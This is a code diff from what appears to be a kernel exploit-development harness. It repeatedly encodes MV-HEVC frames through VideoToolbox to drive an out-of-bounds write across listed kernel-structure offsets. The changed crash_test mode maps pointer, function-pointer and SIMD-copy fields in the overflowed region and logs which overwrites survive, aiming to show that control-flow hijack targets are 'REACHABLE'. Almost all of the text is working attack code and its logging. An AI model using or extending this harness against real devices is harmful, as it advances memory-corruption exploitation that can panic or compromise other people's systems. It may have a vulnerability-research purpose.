@@ -874,43 +874,64 @@ int main(int argc, char *argv[]) {
             if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
 
     } else if (strcmp(mode, "crash_test") == 0) {
-        rlog("CRASH_TEST: Incrementally encode past the +0x5C70 crash boundary\n");
-        rlog("Entry 592 at +0x5C70 is first written during encode 198.\n");
-        rlog("The SIMD copy at 0x769bcc reads +0x5C88 → stores to +0x5C70 → uses as pointer.\n");
-        rlog("If firmware memcpy restores +0x5C88 each encode, entries 601+ are REACHABLE.\n");
-        rlog("If not, PAN fault crashes the kernel at encode 198.\n\n");
-        rlog("Strategy: encode one frame at a time near boundary, check survival.\n\n");
+        rlog("CRASH_TEST: Incrementally encode to find the ACTUAL crash boundary\n");
+        rlog("Known pointer fields in OOB range (may crash when overwritten):\n");
+        rlog("  Entry 274 (+0x4890, ~91 enc): 64-bit pointer, used in struct setup\n");
+        rlog("  Entry 297 (+0x4A00, ~99 enc): 5 refs, heavily used field\n");
+        rlog("  Entry 421 (+0x51C8, ~140 enc): pointer chain walk dereference\n");
+        rlog("  Entry 536 (+0x58F8, ~179 enc): LDR X1 → DEREF [X1+0] and [X1+0x28]\n");
+        rlog("  Entry 579 (+0x5BA0, ~193 enc): passed as arg0 to function call\n");
+        rlog("  Entry 592 (+0x5C70, ~197 enc): SIMD copy target pointer\n");
+        rlog("Strategy: batch to 85 (pre-OOB), then one-at-a-time through danger zones.\n\n");
         if (phase1_verify() != 0) goto done;
         int ct_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
         rlog("layer_id=0x%x\n", ct_lid);
         VTCompressionSessionRef ct_s = create_mvhevc_encoder(128, 128, ct_lid);
         if (!ct_s) { rlog("FAILED: encoder creation\n"); goto done; }
-        rlog("Phase A: Safe baseline (190 encodes)\n");
-        for (int i = 0; i < 190; i++) {
+        rlog("Phase A: Pre-OOB baseline (85 encodes, ~255 entries)\n");
+        for (int i = 0; i < 85; i++) {
             int st = encode_one(ct_s, i, 128, 128);
-            if (st != 0) { rlog("[%d] ENCODE ERROR: %d (pre-boundary!)\n", i, st); break; }
-            if ((i+1) % 50 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*3);
+            if (st != 0) { rlog("[%d] ENCODE ERROR: %d (pre-OOB!)\n", i, st); break; }
+            if ((i+1) % 25 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*3);
         }
-        rlog("\nPhase B: Incremental approach to crash boundary\n");
-        rlog("Encode 191-205, one at a time. Crash expected ~198.\n\n");
-        for (int i = 190; i < 205; i++) {
-            rlog("[%d] encoding... (est entry %d, offset +0x%x)... ", i, i*3, 0x3770 + i*3*16);
+        rlog("\nPhase B: OOB region, one encode at a time (86-205)\n");
+        rlog("Watching for crashes at pointer field boundaries.\n\n");
+        for (int i = 85; i < 205; i++) {
+            int entries = (i+1)*3;
+            const char *zone = "";
+            if (entries >= 592) zone = " [+0x5C70 SIMD ptr]";
+            else if (entries >= 579) zone = " [+0x5BA0 func ptr]";
+            else if (entries >= 536) zone = " [+0x58F8 deref ptr]";
+            else if (entries >= 421) zone = " [+0x51C8 chain walk]";
+            else if (entries >= 297) zone = " [+0x4A00 heavy use]";
+            else if (entries >= 274) zone = " [+0x4890 struct ptr]";
+            else if (entries >= 256) zone = " [OOB started]";
+            rlog("[%d] entries ~%d (+0x%x)%s... ",
+                 i, entries, 0x3770 + entries*16, zone);
+            fflush(stdout);
             int st = encode_one(ct_s, i, 128, 128);
             if (st != 0) {
                 rlog("ERROR %d\n", st);
-                rlog("*** Encode %d failed with error %d ***\n", i, st);
-                rlog("If kernel didn't panic, the error may indicate driver-level rejection.\n");
+                rlog("*** CRASH BOUNDARY: encode %d (entries ~%d) ***\n", i, entries);
+                rlog("*** Last safe encode: %d (entries ~%d) ***\n", i-1, (i)*3);
                 break;
             }
-            rlog("OK (survived! entries through %d)\n", (i+1)*3);
-            if (i == 197) {
-                rlog("*** ENCODE 198 SURVIVED — entries 592-594 written without crash ***\n");
-                rlog("*** The firmware memcpy likely restores +0x5C88 after OOB writes ***\n");
-                rlog("*** Entries 601+ (SIMD/BLRAA) ARE REACHABLE! ***\n");
-            }
-            if (i == 200) {
-                rlog("*** ENCODE 201 SURVIVED — entry 601 (+0x5C88 cumsum) written ***\n");
-                rlog("*** SIMD target pointer now contains cumsum value ***\n");
+            rlog("OK\n");
+            if (i == 91) {
+                rlog("  → Survived entry 274 (+0x4890) overwrite\n");
+            } else if (i == 99) {
+                rlog("  → Survived entry 297 (+0x4A00) overwrite\n");
+            } else if (i == 140) {
+                rlog("  → Survived entry 421 (+0x51C8) overwrite\n");
+            } else if (i == 179) {
+                rlog("  → Survived entry 536 (+0x58F8) overwrite — pointer deref field OK\n");
+            } else if (i == 193) {
+                rlog("  → Survived entry 579 (+0x5BA0) overwrite — func ptr field OK\n");
+            } else if (i == 197) {
+                rlog("*** ENCODE 198 SURVIVED — entry 592 (+0x5C70) written without crash ***\n");
+                rlog("*** Scenario B confirmed: SIMD/BLRAA/type_confusion all REACHABLE ***\n");
+            } else if (i == 200) {
+                rlog("*** ENCODE 201 SURVIVED — entries 601+ viable ***\n");
             }
         }
         VTCompressionSessionCompleteFrames(ct_s, kCMTimeInvalid);
